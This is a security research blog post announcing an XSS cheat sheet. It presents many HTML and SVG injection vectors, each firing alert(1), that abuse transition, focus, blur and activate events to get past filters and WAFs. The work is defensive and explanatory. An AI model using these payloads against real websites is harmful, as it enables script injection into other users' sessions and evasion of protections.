# One XSS cheatsheet to rule them all

Source: https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all
Fetched: 2026-06-28T09:17:29.217327+00:00

One XSS cheatsheet to rule them all

Gareth Heyes

Researcher

@garethheyes

Published: Thursday, 26 September 2019 at 15:00 UTC

Updated: Friday, 4 September 2020 at 14:33 UTC

PortSwigger are proud to launch our brand new XSS cheatsheet.

Our objective was to build the most comprehensive bank of information on bypassing HTML filters and WAFs to achieve XSS, and to present this information in an accessible way. Each vector includes a hosted proof of concept and which browser it successfully executes on.

To ensure this cheat sheet was the best, I explored vectors using a combination of automated fuzzing and manual probing. This lead to quite a few novel XSS vectors, which are likely to be particularly effective at bypassing WAFs and filters - I'll take a look at some of the highlights here.

First up, you might be aware of Mario Heiderich's technique using CSS animations to auto execute on any tag:

<style>@keyframes x{}</style>

<b style="animation-name:x" onanimationstart="alert(1)"></b>

I found you could do the same thing using the ontransitionend event but using the :target selector instead. The :target selector allows you to use the hash of the URL as a target for a CSS id. I use a CSS transition and because the :target selector changes the CSS after the transition is set, the event fires for any tag. You have to specify a hash of "x" in order for the :target selector to change the colour of the element.

<style>

:target {

color:red;

}

/*page.html#x*/

</style>

<x id=x style="transition:color 1s" ontransitionend=alert(1)>

The ontransitionend event works in Chrome, and Firefox supports more events that can be executed automatically. The event ontransitionrun fires on any tag on Firefox and can be triggered like above and the ontransitioncancel will also fire automatically but requires modification of the URL.

You can use iframes or new windows to modify the hash of the URL. Browser SOP (same origin policy) prevents read access to cross domain URLs however it's possible to modify the location cross domain and so you can send the same URL with a hash to trigger the event.

<style>

:target {

transform: rotate(180deg);

}

</style>

<x id=x style="transition transform 10s" ontransitioncancel=alert(1)>

URL: page.html#

URL: page.html#x

URL: page.html#

With the hash in mind I began testing for similar XSS vectors. I discovered that certain elements would fire the focus event when using a hash in the URL with a corresponding id attribute. This means that form elements like input no longer needed an autofocus attribute to automatically focus.

<input onfocus=alert(1) id=x>

someurl.php#x

Other elements also work using the same trick:

<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>

<iframe id=x onfocus=alert(1)>

<embed id=x onfocus=alert(1) type=text/html>

<object id=x onfocus=alert(1) type=text/html>

someurl.php#x

Because the focus event is firing without using an element that supports autofocus, we can use autofocus on another element to cause a blur event on every element that supports the focus trick.

<iframe id=x onblur=alert(1)></iframe><input autofocus>

<input onblur=alert(1) id=x><input autofocus>

<textarea onblur=alert(1) id=x></textarea><input autofocus>

<button onblur=alert(1) id=x></button><input autofocus>

<select onblur=alert(1) id=x></select><input autofocus>

someurl.php#x

Then I started to look at the tags that weren't firing the focus event using this trick. Would it be possible to make them execute? I was testing the anchor tag, if you give it a href attribute that would fire the focus event and if you gave it a tabindex attribute that would also fire the event without requiring the href. I then noticed that using the tabindex attribute would enable this trick to work on pretty much any element! Including custom elements:

<a onfocus=alert(1) id=x href>

<xss onfocus=alert(1) id=x tabindex=1>

<xss onblur=alert(1) id=x tabindex=1><input autofocus>

someurl.php#x

The trick above didn't work on link elements however adding a style with display:block forces the element to be shown and will fire the focus event. This works in the body but not in the head. If you have XSS in a link element you could always use the accesskey trick I published earlier:

<link onfocus=alert(1) id=x tabindex=1 style=display:block>

someurl.php#x

There are more focus based events. For example, onfocusin acts just like onfocus, and onfocusout behaves like onblur, and these events work on custom tags too.

<a onfocusin=alert(1) id=x tabindex=1>

<xss onfocusin=alert(1) id=x tabindex=1>

<xss onfocusout="alert(1)" id="x" tabindex="1"><input autofocus>

someurl.php#x

IE has some events when elements are activated;  onactivate can be used just like onfocus and works with custom tags, and onbeforeactivate fires before the element is activated.

<a onactivate=alert(1) id=x tabindex=1>

<div onactivate=alert(1) id=x tabindex=1>

<xss onactivate=alert(1) id=x tabindex=1>

<a onbeforeactivate=alert(1) id=x tabindex=1>

someurl.php#x

IE also has the ondeactivate and onbeforedeactivate events, in order to automatically execute these events you need to modify the hash twice as autofocus won't work in IE when the first element is focused.

<a ondeactivate=alert(1) id=x tabindex=1></a><input id=y autofocus>

<xss ondeactivate=alert(1) id=x tabindex=1></xss><input id=y autofocus>

<a onbeforedeactivate=alert(1) id=x tabindex=1></a><input id=y autofocus>

someurl.php#x

someurl.php#y

Finally here is a Chrome specific vector that works inside SVG:

<svg><discard onbegin=alert(1)>

There are many more vectors in the cheatsheet; I just chose the most interesting for the blog post. Browse on over to the XSS cheatsheet to view the rest.

XSS

cheatsheet

vectors

JavaScript

HTML

Back to all articles

Related Research

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

03 September 2025

Cookie Chaos: How to bypass __Host and __Secure cookie prefixes

Stealing HttpOnly cookies with the cookie sandwich technique

22 January 2025

Stealing HttpOnly cookies with the cookie sandwich technique

Bypassing WAFs with the phantom $Version cookie

04 December 2024

Bypassing WAFs with the phantom $Version cookie

New crazy payloads in the URL Validation Bypass Cheat Sheet

29 October 2024

New crazy payloads in the URL Validation Bypass Cheat Sheet
